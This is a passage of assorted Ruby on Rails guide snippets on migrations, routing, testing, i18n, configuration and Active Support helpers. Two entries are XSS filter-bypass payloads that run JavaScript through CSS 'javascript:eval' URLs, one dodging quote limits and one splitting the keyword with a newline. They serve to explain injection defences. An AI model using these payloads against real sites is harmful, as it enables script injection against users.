d.beginning_of_quarter   # => Thu, 01 Apr 2010
d.end_of_quarter         # => Wed, 30 Jun 2010

----------------------------------------

TITLE: Using after_initialize for Boot-Time Validation of Reloadable Classes
DESCRIPTION: Using after_initialize callback to perform a database check that only needs to run once at boot time. This is an exception to the general rule about not referencing reloadable classes in initializers.

LANGUAGE: ruby
CODE:
# config/initializers/check_admin_presence.rb
Rails.application.config.after_initialize do
  unless Role.where(name: "admin").exists?
    abort "The admin role is not present, please seed the database."
  end
end

----------------------------------------

TITLE: Using custom annotation tags with the notes command
DESCRIPTION: After registering custom annotation tags, the bin/rails notes command will find and display them along with the default ones like TODO and FIXME.

LANGUAGE: bash
CODE:
$ bin/rails notes
app/controllers/admin/users_controller.rb:
  * [ 20] [TODO] do A/B testing on this
  * [ 42] [TESTME] this needs more functional tests
  * [132] [DEPRECATEME] ensure this method is deprecated in next release

----------------------------------------

TITLE: Installing Dependencies on Debian
DESCRIPTION: Commands to install all required dependencies for Rails development on Debian, including database systems (with MariaDB as the default MySQL server), Redis, memcached, and tools for image/video processing.

LANGUAGE: bash
CODE:
$ sudo apt-get install sqlite3 libsqlite3-dev default-mysql-server default-libmysqlclient-dev postgresql postgresql-client postgresql-contrib libpq-dev redis-server memcached imagemagick ffmpeg mupdf mupdf-tools libxml2-dev libvips42 poppler-utils

----------------------------------------

TITLE: Setting Up MySQL Database for Active Record Tests
DESCRIPTION: Shows how to set up the MySQL database required for running Active Record tests. This creates necessary tables with appropriate users and permissions.

LANGUAGE: bash
CODE:
$ cd activerecord
$ bundle exec rake db:mysql:build

----------------------------------------

TITLE: Running Tests at a Specific Line in Rails
DESCRIPTION: Shows how to run a test at a specific line number in a test file. This is useful when you know the line number where your test starts.

LANGUAGE: bash
CODE:
$ cd railties
$ bin/test test/application/asset_debugging_test.rb:69

----------------------------------------

TITLE: Using to and from methods in Ruby on Rails Array extensions
DESCRIPTION: The to method returns a subarray of elements up to a specific index, while from returns the tail from a specific index to the end. Defined in active_support/core_ext/array/access.rb.

LANGUAGE: ruby
CODE:
%w(a b c d).to(2) # => ["a", "b", "c"]
[].to(7)          # => []

LANGUAGE: ruby
CODE:
%w(a b c d).from(2)  # => ["c", "d"]
%w(a b c d).from(10) # => []
[].from(0)           # => []

----------------------------------------

TITLE: Deprecating ActiveSupport::SecureRandom in Ruby
DESCRIPTION: Marked ActiveSupport::SecureRandom as deprecated in favor of the SecureRandom module from the Ruby standard library, encouraging use of the built-in implementation.

LANGUAGE: ruby
CODE:
ActiveSupport::SecureRandom

----------------------------------------

TITLE: Using a Class Method Callback in a Model
DESCRIPTION: Shows how to use a callback class with class methods in a model. The class itself is passed as the callback, with no need for instantiation.

LANGUAGE: ruby
CODE:
class PictureFile < ApplicationRecord
  after_commit FileDestroyerCallback
end

----------------------------------------

TITLE: Using Relative Translation Lookup in Rails View
DESCRIPTION: Demonstrates how to use relative translation lookups with the dot prefix in the translate helper. This automatically includes the controller and action names in the translation key.

LANGUAGE: erb
CODE:
<h1><%= t ".title" %></h1>

----------------------------------------

TITLE: Setting Environment Variables in Rails Server
DESCRIPTION: Sets the RAILS_ENV environment variable based on the server options if not already defined.

LANGUAGE: ruby
CODE:
module Rails
  module Server
    def set_environment
      ENV["RAILS_ENV"] ||= options[:environment]
    end
  end
end

----------------------------------------

TITLE: Using Inheritance with Internationalized Validation Messages
DESCRIPTION: Demonstrates how validation error messages are looked up in the inheritance chain for models that inherit from other models.

LANGUAGE: ruby
CODE:
class Admin < User
  validates :name, presence: true
end

----------------------------------------

TITLE: Creating has_one Associations in Rails
DESCRIPTION: This snippet demonstrates how to create and save a new associated object using the create_association method. This instantiates a new object, sets the foreign key, and saves it to the database if validations pass.

LANGUAGE: ruby
CODE:
@account = @supplier.create_account(terms: "Net 30")

----------------------------------------

TITLE: Using assert_no_error_reported for Testing Error Absence in Rails
DESCRIPTION: Tests that no errors have been reported within the block execution.

LANGUAGE: ruby
CODE:
assert_no_error_reported { block }

----------------------------------------

TITLE: Configuring Basic RedisCacheStore in Rails
DESCRIPTION: Sets up a basic Redis-based cache store using an environment variable for the Redis URL. This provides a simple configuration for using Redis as a cache backend.

LANGUAGE: ruby
CODE:
config.cache_store = :redis_cache_store, { url: ENV["REDIS_URL"] }

----------------------------------------

TITLE: Migrating Logger Broadcast API in Rails 7.1
DESCRIPTION: Shows how to migrate from the removed ActiveSupport::Logger.broadcast method to the new BroadcastLogger API in Rails 7.1.

LANGUAGE: ruby
CODE:
logger = Logger.new("some_file.log")

# Before

Rails.logger.extend(ActiveSupport::Logger.broadcast(logger))

# After

Rails.logger.broadcast_to(logger)

----------------------------------------

TITLE: Configuring Cookie-Based Session Store in Rails API Application
DESCRIPTION: Shows how to configure session middleware in a Rails API application that doesn't include session management by default, setting up the cookie store with custom options.

LANGUAGE: ruby
CODE:
# This also configures session_options for use below
config.session_store :cookie_store, key: "_your_app_session"

# Required for all session management (regardless of session_store)
config.middleware.use ActionDispatch::Cookies

config.middleware.use config.session_store, config.session_options

----------------------------------------

TITLE: Generating a Remove Column Migration in Rails
DESCRIPTION: This command generates a migration to remove the part_number column from the products table. The generator interprets the RemoveXXXFromYYY naming pattern.

LANGUAGE: bash
CODE:
$ bin/rails generate migration RemovePartNumberFromProducts part_number:string

----------------------------------------

TITLE: JavaScript eval() Technique for CSS Injection Bypassing Quote Restrictions
DESCRIPTION: Advanced CSS injection example using JavaScript's eval() function and expression attributes to execute code when quotes are restricted in the payload.

LANGUAGE: html
CODE:
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">

----------------------------------------

TITLE: Customizing Model Name for a Namespaced Class in Rails
DESCRIPTION: Demonstrates how to override the model_name method to customize the name used in form helpers and URL generation, removing the namespace from the path.

LANGUAGE: ruby
CODE:
module Person
  class Profile
    include ActiveModel::Model

    def self.model_name
      ActiveModel::Name.new(self, nil, "Profile")
    end
  end
end

----------------------------------------

TITLE: Scripting Debug Workflows in Rails Controller Methods
DESCRIPTION: This snippet demonstrates how to script a debugging workflow within a controller method. It uses the debugger with a do parameter to automatically set up a catch breakpoint for ActiveRecord::RecordInvalid exceptions and display a backtrace upon catching the exception.

LANGUAGE: ruby
CODE:
def create
  debugger(do: "catch ActiveRecord::RecordInvalid do: bt 10")
  # ...
end

----------------------------------------

TITLE: Defining a Basic GET Route in Rails
DESCRIPTION: Demonstrates how to define a basic GET route in Rails that maps to a controller action. This route will direct GET requests to '/products' to the index action of the ProductsController.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
  get "/products", to: "products#index"
end

----------------------------------------

TITLE: Invoking Rake tasks from command line in Rails
DESCRIPTION: Examples of how to call Rake tasks with the bin/rails command. Shows basic invocation, passing arguments, and using namespaced tasks.

LANGUAGE: bash
CODE:
$ bin/rails task_name
$ bin/rails "task_name[value 1]" # entire argument string should be quoted
$ bin/rails "task_name[value 1,value2,value3]" # separate multiple args with a comma
$ bin/rails db:nothing

----------------------------------------

TITLE: Sending Email with Custom Body Without Template Rendering
DESCRIPTION: Example of sending an email with a custom body provided as a string parameter without using a template. It specifies content_type as 'text/html' to override the default 'text/plain'.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  def welcome_email
    mail(to: params[:user].email,
         body: params[:email_body],
         content_type: "text/html",
         subject: "Already rendered!")
  end
end

----------------------------------------

TITLE: Database Configuration for Solid Queue in Rails
DESCRIPTION: YAML configuration for database connections, including a separate database for queue storage with its migrations path specified.

LANGUAGE: yaml
CODE:
# config/database.yml
development:
  primary:
    <<: *default
    database: storage/development.sqlite3
  queue:
    <<: *default
    database: storage/development_queue.sqlite3
    migrations_paths: db/queue_migrate

----------------------------------------

TITLE: Configuring Parallel Testing in Rails
DESCRIPTION: Example of configuring parallel test execution in Rails. This code demonstrates how to enable test parallelization with a specific number of workers and set up hooks for database configuration.

LANGUAGE: ruby
CODE:
class ActiveSupport::TestCase
  parallelize(workers: 2)
end

----------------------------------------

TITLE: Validating Absence of an Association
DESCRIPTION: Example of validating that an association is absent rather than just checking the foreign key. This demonstrates how to ensure a relationship doesn't exist.

LANGUAGE: ruby
CODE:
class LineItem < ApplicationRecord
  belongs_to :order, optional: true
  validates :order, absence: true
end

----------------------------------------

TITLE: Creating Subscriber Test Fixtures in YAML
DESCRIPTION: Defines YAML fixtures for subscribers to use in tests. Creates two subscriber records with different emails associated with the same product for testing notification functionality.

LANGUAGE: yaml
CODE:
david:
  product: tshirt
  email: david@example.org

chris:
  product: tshirt
  email: chris@example.org

----------------------------------------

TITLE: Searching code for annotation comments with Rails notes command
DESCRIPTION: The bin/rails notes command searches through project files for comments with specific keywords like TODO, FIXME, and OPTIMIZE. It displays the file, line number, and content of the annotation.

LANGUAGE: bash
CODE:
$ bin/rails notes
app/controllers/admin/users_controller.rb:
  * [ 20] [TODO] any other way to do this?
  * [132] [FIXME] high priority for next deploy

lib/school.rb:
  * [ 13] [OPTIMIZE] refactor this code to make it faster
  * [ 17] [FIXME]

----------------------------------------

TITLE: Listing Available Services with Homebrew on macOS
DESCRIPTION: Command to list all available services installed via Homebrew on macOS. This helps developers see what services are available for starting.

LANGUAGE: bash
CODE:
$ brew services list

----------------------------------------

TITLE: Using instance methods in migrations instead of class methods
DESCRIPTION: Illustrates the new approach of defining migrations using instance methods rather than class methods, which is the preferred way in Rails 3.1.

LANGUAGE: ruby
CODE:
class FooMigration < ActiveRecord::Migration
  def up # Not self.up
    # ...
  end
end

----------------------------------------

TITLE: Disabling deep_munge Protection in Rails Configuration
DESCRIPTION: This configuration disables the deep_munge protection mechanism in Rails. This should only be used when the developer is aware of the risks and knows how to handle potentially malicious parameters safely.

LANGUAGE: ruby
CODE:
config.action_dispatch.perform_deep_munge = false

----------------------------------------

TITLE: Initializing a Person Model with City Attribute in Ruby
DESCRIPTION: This snippet shows how to initialize a Person model object with a city attribute. This object will be used to demonstrate binding a select box to a model attribute.

LANGUAGE: ruby
CODE:
@person = Person.new(city: "MD")

----------------------------------------

TITLE: Reopening Engine Model Class Using class_eval
DESCRIPTION: Demonstrates how to reopen an engine model class using class_eval to safely extend or override its functionality from the host application.

LANGUAGE: ruby
CODE:
# MyApp/app/overrides/models/blorgh/article_override.rb
Blorgh::Article.class_eval do
  # ...
end

----------------------------------------

TITLE: Exception Handling in after_commit Callbacks
DESCRIPTION: Example showing how exceptions in after_commit callbacks prevent subsequent callbacks from executing. When the first callback raises an error, the second one never runs.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  after_commit { raise "Intentional Error" }
  after_commit {
    # This won't get called because the previous after_commit raises an exception
    Rails.logger.info("This will not be logged")
  }
end

----------------------------------------

TITLE: Adding Spanish Locale Configuration in Rails
DESCRIPTION: Demonstrates how to create a Spanish locale configuration file with a translation for the 'hello' key. This allows the application to display Spanish text when the locale is set to 'es'.

LANGUAGE: yaml
CODE:
es:
  hello: "Hola mundo"

----------------------------------------

TITLE: Using assert_no_queries_match for Testing SQL Query Pattern Absence in Rails
DESCRIPTION: Tests that a block generates no SQL queries that match a specific pattern.

LANGUAGE: ruby
CODE:
assert_no_queries_match(pattern, &block)

----------------------------------------

TITLE: Setting Class Methods with ActiveSupport.on_load in Rails
DESCRIPTION: This example shows how to set class methods on ActiveRecord::Base using ActiveSupport.on_load hooks. It demonstrates configuring the include_root_in_json option in a way that doesn't trigger premature framework loading.

LANGUAGE: ruby
CODE:
ActiveRecord::Base.include_root_in_json = true

LANGUAGE: ruby
CODE:
ActiveSupport.on_load(:active_record) do
  # self refers to ActiveRecord::Base here
  self.include_root_in_json = true
end

----------------------------------------

TITLE: Rails Test Runner Help Command
DESCRIPTION: The help output from the Rails test runner, showing all available command-line options and examples of how to use them for different testing scenarios.

LANGUAGE: bash
CODE:
$ bin/rails test -h
Usage:
  bin/rails test [PATHS...]

Run tests except system tests

Examples:
    You can run a single test by appending a line number to a filename:

        bin/rails test test/models/user_test.rb:27

    You can run multiple tests with in a line range by appending the line range to a filename:

        bin/rails test test/models/user_test.rb:10-20

    You can run multiple files and directories at the same time:

        bin/rails test test/controllers test/integration/login_test.rb

    By default test failures and errors are reported inline during a run.

minitest options:
    -h, --help                       Display this help.
        --no-plugins                 Bypass minitest plugin auto-loading (or set $MT_NO_PLUGINS).
    -s, --seed SEED                  Sets random seed. Also via env. Eg: SEED=n rake
    -v, --verbose                    Verbose. Show progress processing files.
        --show-skips                 Show skipped at the end of run.
    -n, --name PATTERN               Filter run on /regexp/ or string.
        --exclude PATTERN            Exclude /regexp/ or string from run.
    -S, --skip CODES                 Skip reporting of certain types of results (eg E).

Known extensions: rails, pride
    -w, --warnings                   Run with Ruby warnings enabled
    -e, --environment ENV            Run tests in the ENV environment
    -b, --backtrace                  Show the complete backtrace
    -d, --defer-output               Output test failures and errors after the test run
    -f, --fail-fast                  Abort test run on first failure or error
    -c, --[no-]color                 Enable color in the output
        --profile [COUNT]            Enable profiling of tests and list the slowest test cases (default: 10)
    -p, --pride                      Pride. Show your testing pride!

----------------------------------------

TITLE: Enqueuing a Job with Multiple Arguments in Rails
DESCRIPTION: Shows how to pass multiple arguments to a job when enqueuing it, including positional and keyword arguments.

LANGUAGE: ruby
CODE:
# `perform_now` and `perform_later` will call `perform` under the hood so
# you can pass as many arguments as defined in the latter.
GuestsCleanupJob.perform_later(guest1, guest2, filter: "some_filter")

----------------------------------------

TITLE: Creating a Join Table
DESCRIPTION: Migration that creates a join table for a many-to-many relationship between products and categories using the create_join_table method.

LANGUAGE: ruby
CODE:
create_join_table :products, :categories

----------------------------------------

TITLE: Removing Default Middleware from Rails API Application
DESCRIPTION: Shows how to remove a middleware that is included by default in the Rails API middleware stack.

LANGUAGE: ruby
CODE:
config.middleware.delete ::Rack::Sendfile

----------------------------------------

TITLE: Generating a Join Table Migration in Rails
DESCRIPTION: This command generates a migration to create a join table between users and products tables, typically used for many-to-many relationships.

LANGUAGE: bash
CODE:
$ bin/rails generate migration CreateJoinTableUserProduct user product

----------------------------------------

TITLE: Setting Action Mailbox Incineration Period in Ruby
DESCRIPTION: Demonstrates how to configure the retention period for processed inbound emails in Action Mailbox before they are deleted (incinerated).

LANGUAGE: ruby
CODE:
# Incinerate inbound emails 14 days after processing.
config.action_mailbox.incinerate_after = 14.days

----------------------------------------

TITLE: Using Record Identification with form_with in Rails
DESCRIPTION: Compares the long and short forms of using form_with with record identification for a new Article. Rails automatically determines the correct URL and method from the model instance.

LANGUAGE: ruby
CODE:
# longer way:
form_with(model: @article, url: articles_path)
# short-hand:
form_with(model: @article)

----------------------------------------

TITLE: Using String#downcase_first in Ruby on Rails
DESCRIPTION: This method converts the first letter of a string to lowercase while leaving the rest unchanged. It's useful for formatting text where the first character needs to be lowercase.

LANGUAGE: ruby
CODE:
"If I had read Alice in Wonderland".downcase_first # => "if I had read Alice in Wonderland"
"".downcase_first                                  # => ""

----------------------------------------

TITLE: JavaScript Injection with Newline Character to Bypass Word Filters
DESCRIPTION: Example showing how inserting a newline character between 'java' and 'script' can bypass filters that block the complete 'javascript' keyword.

LANGUAGE: html
CODE:
<div id="mycode" expr="alert('hah!')" style="background:url('javaâµscript:eval(document.all.mycode.expr)')">

----------------------------------------

TITLE: Improper Currency Translation in Rails ERB Template
DESCRIPTION: An example of incorrect internationalization in an ERB template. This approach makes assumptions about grammar and currency symbol placement that don't hold true across different languages.

LANGUAGE: erb
CODE:
<!-- app/views/products/show.html.erb -->
<%= "#{t('currency')}#{@product.price}" %>

----------------------------------------

TITLE: Defining Model Associations for Nested Resources in Rails
DESCRIPTION: Example models showing a parent-child relationship between Magazine and Ad, where a Magazine has many Ads and an Ad belongs to a Magazine. This relationship will be reflected in the routing.

LANGUAGE: ruby
CODE:
class Magazine < ApplicationRecord
  has_many :ads
end

class Ad < ApplicationRecord
  belongs_to :magazine
end

----------------------------------------

TITLE: Using Custom Zeitwerk Inflector for Complete Control over Inflections
DESCRIPTION: Replaces the default inflector with a custom Zeitwerk::Inflector instance for absolute control over inflections without depending on ActiveSupport's inflection rules.

LANGUAGE: ruby
CODE:
Rails.autoloaders.each do |autoloader|
  autoloader.inflector = Zeitwerk::Inflector.new
  autoloader.inflector.inflect(
    "html_parser" => "HTMLParser",
    "ssl_error"   => "SSLError"
  )
end

----------------------------------------

TITLE: Configuring Capybara for Remote Server Testing
DESCRIPTION: This configuration allows Capybara to work with applications running in Docker containers or other remote environments by binding to all network interfaces and setting the correct app host.

LANGUAGE: ruby
CODE:
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  setup do
      Capybara.server_host = "0.0.0.0" # bind to all interfaces
      Capybara.app_host = "http://#{IPSocket.getaddress(Socket.gethostname)}" if ENV["SELENIUM_REMOTE_URL"].present?
    end
  # ...
end

----------------------------------------

TITLE: HTML Output for Model-Bound Select Box
DESCRIPTION: The HTML output generated when binding a select box to a model attribute. The name attribute is namespaced with the model name, and the appropriate option is automatically selected based on the model's attribute value.

LANGUAGE: html
CODE:
<select name="person[city]" id="person_city">
  <option value="BE">Berlin</option>
  <option value="CHI">Chicago</option>
  <option value="MD" selected="selected">Madrid</option>
</select>

----------------------------------------

TITLE: Block Helpers Syntax in Rails 3.0 ERB Templates
DESCRIPTION: Example of using form_for with a block in Rails 3.0 ERB templates. Block helpers that insert content now use <%= %> instead of <% %> at the beginning of the block.

LANGUAGE: erb
CODE:
<%= form_for @post do |f| %>
  ...
<% end %>

----------------------------------------

TITLE: Displaying Controller Generator Help
DESCRIPTION: Shows the usage information for the controller generator, including required parameters and examples. This helps developers understand how to properly structure their controller generation commands.

LANGUAGE: bash
CODE:
$ bin/rails generate controller
Usage:
  bin/rails generate controller NAME [action action] [options]

...
...

Description:
    ...

    To create a controller within a module, specify the controller name as a path like 'parent_module/controller_name'.

    ...

Example:
    `bin/rails generate controller CreditCards open debit credit close`

    Credit card controller with URLs like /credit_cards/debit.
        Controller: app/controllers/credit_cards_controller.rb
        Test:       test/controllers/credit_cards_controller_test.rb
        Views:      app/views/credit_cards/debit.html.erb [...]
        Helper:     app/helpers/credit_cards_helper.rb

----------------------------------------

TITLE: Reverting All Migrations from an Engine
DESCRIPTION: Command to revert all migrations from a specific engine by setting the VERSION to 0.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate SCOPE=blorgh VERSION=0

----------------------------------------

TITLE: Clearing all Objects from has_many Collection in Rails
DESCRIPTION: Example of removing all objects from a has_many collection according to the dependent option strategy. For standard has_many, it sets foreign keys to NULL by default.

LANGUAGE: ruby
CODE:
@author.books.clear

----------------------------------------

TITLE: Custom Active Record Migration Strategy Implementation in Ruby
DESCRIPTION: Example of creating and configuring a custom migration strategy that inherits from the default strategy. This demonstrates how to override specific migration methods, in this case preventing table dropping.

LANGUAGE: ruby
CODE:
class CustomMigrationStrategy < ActiveRecord::Migration::DefaultStrategy
  def drop_table(*)
    raise "Dropping tables is not supported!"
  end
end

config.active_record.migration_strategy = CustomMigrationStrategy

----------------------------------------

TITLE: Rails Debugger Session Example Output
DESCRIPTION: This snippet shows the console output when a debugger session is triggered, displaying the current execution point with file and line information and a backtrace overview.

LANGUAGE: ruby
CODE:
Processing by PostsController#index as HTML
[2, 11] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb
     2|   before_action :set_post, only: %i[ show edit update destroy ]
     3|
     4|   # GET /posts or /posts.json
     5|   def index
     6|     @posts = Post.all
=>   7|     debugger
     8|   end
     9|
    10|   # GET /posts/1 or /posts/1.json
    11|   def show
=>#0    PostsController#index at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:7
  #1    ActionController::BasicImplicitRender#send_action(method="index", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/action_controller/metal/basic_implicit_render.rb:6
  # and 72 frames (use `bt' command for all frames)
(rdbg)

----------------------------------------

TITLE: Using custom annotations with Rails notes command
DESCRIPTION: The bin/rails notes command can be customized to search for specific annotations using the --annotations flag. This allows focusing on particular types of comments in the codebase.

LANGUAGE: bash
CODE:
$ bin/rails notes --annotations FIXME RELEASE
app/controllers/admin/users_controller.rb:
  * [101] [RELEASE] We need to look at this before next release
  * [132] [FIXME] high priority for next deploy

lib/school.rb:
  * [ 17] [FIXME]

----------------------------------------

TITLE: Getting Collection Name for Model in Rails
DESCRIPTION: Shows the model_name.collection method which returns the plural snake_cased name without namespace. Used for naming collections in views.

LANGUAGE: irb
CODE:
irb> Person.model_name.collection
=> "people"

----------------------------------------

TITLE: Params Structure for Nested Attributes in Rails
DESCRIPTION: Shows the format of params hash that is generated when submitting a form with nested attributes. The addresses_attributes hash contains indexed attributes for each address.

LANGUAGE: ruby
CODE:
{
  "person" => {
    "name" => "John Doe",
    "addresses_attributes" => {
      "0" => {
        "kind" => "Home",
        "street" => "221b Baker Street"
      },
      "1" => {
        "kind" => "Office",
        "street" => "31 Spooner Street"
      }
    }
  }
}

----------------------------------------

TITLE: Translation Files for Rails I18n
DESCRIPTION: YAML translation files for English and a custom 'pirate' locale, containing translations for keys used in the application.

LANGUAGE: yaml
CODE:
# config/locales/en.yml
en:
  hello_world: Hello world!
  hello_flash: Hello flash!

LANGUAGE: yaml
CODE:
# config/locales/pirate.yml
pirate:
  hello_world: Ahoy World
  hello_flash: Ahoy Flash

----------------------------------------

TITLE: Alternative Approach to button_to in Rails 7.0 Using Path Helpers
DESCRIPTION: Shows an alternative approach to maintain POST behavior with button_to by using path helpers instead of record arrays.

LANGUAGE: ruby
CODE:
-button_to("Do a POST", [:my_custom_post_action_on_workshop, Workshop.find(1)])
+button_to("Do a POST", my_custom_post_action_on_workshop_workshop_path(Workshop.find(1)))

----------------------------------------

TITLE: Testing Flash Messages in Controller Tests
DESCRIPTION: Shows how to test flash messages that are set after a successful create action.

LANGUAGE: ruby
CODE:
test "should create article" do
  assert_difference("Article.count") do
    post articles_url, params: { article: { title: "Some title" } }
  end

  assert_redirected_to article_path(Article.last)
  assert_equal "Article was successfully created.", flash[:notice]
end

----------------------------------------

TITLE: Configuring Relay Ingress for Exim in Rails
DESCRIPTION: Configuration for setting up the Exim email relay ingress in a Rails application. This allows the application to receive emails via an SMTP relay.

LANGUAGE: ruby
CODE:
# config/environments/production.rb
config.action_mailbox.ingress = :relay

----------------------------------------

TITLE: Migrating Database for Authentication Tables
DESCRIPTION: Command to run database migrations that create User and Session tables for the authentication system.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Grouping Records in ActiveRecord Queries
DESCRIPTION: Demonstrates how to use the 'group' method to group records by a specified column, similar to SQL GROUP BY clause.

LANGUAGE: ruby
CODE:
Order.select("created_at").group("created_at")

LANGUAGE: sql
CODE:
SELECT created_at
FROM orders
GROUP BY created_at

----------------------------------------

TITLE: Basic Ruby Documentation Format with Examples
DESCRIPTION: Shows how to format short documentation with embedded code examples that demonstrate the method's functionality.

LANGUAGE: ruby
CODE:
# Converts a collection of elements into a formatted string by
# calling +to_s+ on all elements and joining them.
#
#   Blog.all.to_fs # => "First PostSecond PostThird Post"

----------------------------------------

TITLE: Including Turbo-tracked Stylesheets in Rails
DESCRIPTION: Shows how to include a stylesheet with Turbo tracking enabled, which causes the page to reload when the asset changes. This is useful for automatically refreshing the page when stylesheets are updated.

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag "application", "data-turbo-track": "reload" %>

----------------------------------------

TITLE: Backporting Range#cover? Method in Ruby 1.8
DESCRIPTION: Added Range#cover? as an alias for Range#include? in Ruby 1.8 for compatibility with newer Ruby versions, allowing consistent range checking syntax.

LANGUAGE: ruby
CODE:
Range#cover?

----------------------------------------

TITLE: Running Migrations for Action Text Tables
DESCRIPTION: Command to execute the migrations that add the necessary tables for Action Text and Active Storage to the database.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Using ActiveModel::Model Objects in IRB Console
DESCRIPTION: This snippet demonstrates initializing a Person object that includes ActiveModel::Model with attributes and accessing those attributes in the IRB console.

LANGUAGE: ruby
CODE:
irb> person = Person.new(name: 'bob', age: '18')
irb> person.name # => "bob"
irb> person.age  # => "18"

----------------------------------------

TITLE: Setting Parallel Workers via Environment Variable in Rails Tests
DESCRIPTION: Command to override the default number of parallel workers using an environment variable. This allows changing the parallelization level without modifying the code.

LANGUAGE: bash
CODE:
$ PARALLEL_WORKERS=15 bin/rails test

----------------------------------------

TITLE: Using to_partial_path in ActiveModel::Conversion in IRB
DESCRIPTION: This IRB session demonstrates the to_partial_path method from ActiveModel::Conversion. It returns a string representing the path associated with the object, which Action Pack uses to find a suitable partial to represent the object.

LANGUAGE: ruby
CODE:
irb> person.to_partial_path
=> "people/person"

----------------------------------------

TITLE: Creating a Rails Application with Propshaft
DESCRIPTION: Command to create a new Rails application, which will use Propshaft as the default asset pipeline in Rails 8+.

LANGUAGE: bash
CODE:
$ rails new app_name

----------------------------------------

TITLE: Using Numeric Time Calculation Methods in Ruby on Rails
DESCRIPTION: These methods enable time declarations and calculations by converting numbers into time durations. They can be combined for precise time calculations.

LANGUAGE: ruby
CODE:
# equivalent to Time.current.advance(days: 1)
1.day.from_now

# equivalent to Time.current.advance(weeks: 2)
2.weeks.from_now

# equivalent to Time.current.advance(days: 4, weeks: 5)
(4.days + 5.weeks).from_now

----------------------------------------

TITLE: YAML Fixtures with Associations in Rails
DESCRIPTION: Example of defining fixtures with associations between models. Shows how to reference related fixtures using the fixture name as the association value.

LANGUAGE: yaml
CODE:
# test/fixtures/categories.yml
web_frameworks:
  name: Web Frameworks

LANGUAGE: yaml
CODE:
# test/fixtures/articles.yml
first:
  title: Welcome to Rails!
  category: web_frameworks

LANGUAGE: yaml
CODE:
# test/fixtures/action_text/rich_texts.yml
first_content:
  record: first (Article)
  name: content
  body: <div>Hello, from <strong>a fixture</strong></div>

----------------------------------------

TITLE: Setting Up Parameter Wrapping in Rails 3.1
DESCRIPTION: Configuration for ActionController::ParamsWrapper which enables wrapping parameters into a nested hash, particularly for JSON requests. Also disables root element in JSON by default.

LANGUAGE: ruby
CODE:
# Be sure to restart your server when you modify this file.
# This file contains settings for ActionController::ParamsWrapper which
# is enabled by default.

# Enable parameter wrapping for JSON. You can disable this by setting :format to an empty array.
ActiveSupport.on_load(:action_controller) do
  wrap_parameters :format => [:json]
end

# Disable root element in JSON by default.
ActiveSupport.on_load(:active_record) do
  self.include_root_in_json = false
end

----------------------------------------

TITLE: Leap Year Handling with prev_year and next_year in Ruby
DESCRIPTION: Example showing how prev_year and next_year handle February 29th in leap years when moving to non-leap years.

LANGUAGE: ruby
CODE:
t = Time.new(2000, 2, 29) # => 2000-02-29 00:00:00 +0900
t.prev_year               # => 1999-02-28 00:00:00 +0900
t.next_year               # => 2001-02-28 00:00:00 +0900

----------------------------------------

TITLE: PostgreSQL Configuration in database.yml
DESCRIPTION: Shows the database configuration file generated when creating a Rails application with PostgreSQL. This YAML configuration sets up the database adapter, encoding, and connection pooling.

LANGUAGE: yaml
CODE:
# PostgreSQL. Versions 9.3 and up are supported.
#
# Install the pg driver:
#   gem install pg
# On macOS with Homebrew:
#   gem install pg -- --with-pg-config=/opt/homebrew/bin/pg_config
# On Windows:
#   gem install pg
#       Choose the win32 build.
#       Install PostgreSQL and put its /bin directory on your path.
#
# Configure Using Gemfile
# gem "pg"
#
default: &default
  adapter: postgresql
  encoding: unicode

  # For details on connection pooling, see Rails configuration guide
  # https://guides.rubyonrails.org/configuring.html#database-pooling
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>

development:
  <<: *default
  database: petstore_development
...

----------------------------------------

TITLE: Scanning custom directories for annotations with notes command
DESCRIPTION: After configuring custom directories, the rails notes command will include files from these locations in its search for annotations like TODO and FIXME.

LANGUAGE: bash
CODE:
$ bin/rails notes
app/controllers/admin/users_controller.rb:
  * [ 20] [TODO] any other way to do this?
  * [132] [FIXME] high priority for next deploy

lib/school.rb:
  * [ 13] [OPTIMIZE] Refactor this code to make it faster
  * [ 17] [FIXME]

spec/models/user_spec.rb:
  * [122] [TODO] Verify the user that has a subscription works

vendor/tools.rb:
  * [ 56] [TODO] Get rid of this dependency

----------------------------------------

TITLE: Using strip_links Method in Rails
DESCRIPTION: Examples of using the strip_links method to remove HTML link tags from text while preserving the link text. This helps in sanitizing content while keeping the important text information.

LANGUAGE: ruby
CODE:
strip_links("<a href='https://rubyonrails.org'>Ruby on Rails</a>")
# => Ruby on Rails

strip_links("emails to <a href='mailto:me@email.com'>me@email.com</a>.")
# => emails to me@email.com.

strip_links("Blog: <a href='http://myblog.com/'>Visit</a>.")
# => Blog: Visit.

----------------------------------------

TITLE: Applying Constraints in Block Form with a Class in Rails Routes
DESCRIPTION: Shows how to apply the same constraint to multiple routes using a block form with a RestrictedListConstraint class. This approach is useful when applying the same rule to several routes.

LANGUAGE: ruby
CODE:
class RestrictedListConstraint
  # ...Same as the example above
end

Rails.application.routes.draw do
  constraints(RestrictedListConstraint.new) do
    get "*path", to: "restricted_list#index"
    get "*other-path", to: "other_restricted_list#index"
  end
end

----------------------------------------

TITLE: Updating Tests for XHR JavaScript Requests in Rails
DESCRIPTION: Due to changes in `protect_from_forgery` that prevent cross-origin <script> tags, tests making JavaScript format requests need to be updated to use xhr methods instead of regular HTTP verbs.

LANGUAGE: ruby
CODE:
xhr :get, :foo, format: :js

----------------------------------------

TITLE: Appending HTML Safe Content to Safe Strings in Ruby
DESCRIPTION: Demonstrates that when appending safe content to safe strings, no additional escaping occurs, as both strings are already marked as trusted.

LANGUAGE: ruby
CODE:
"".html_safe + "<".html_safe # => "<"

----------------------------------------

TITLE: Getting Original Attribute Value with _was in Rails
DESCRIPTION: Shows the [attr_name]_was method which returns the previous value of a changed attribute. Useful for accessing what a value was before it was modified.

LANGUAGE: irb
CODE:
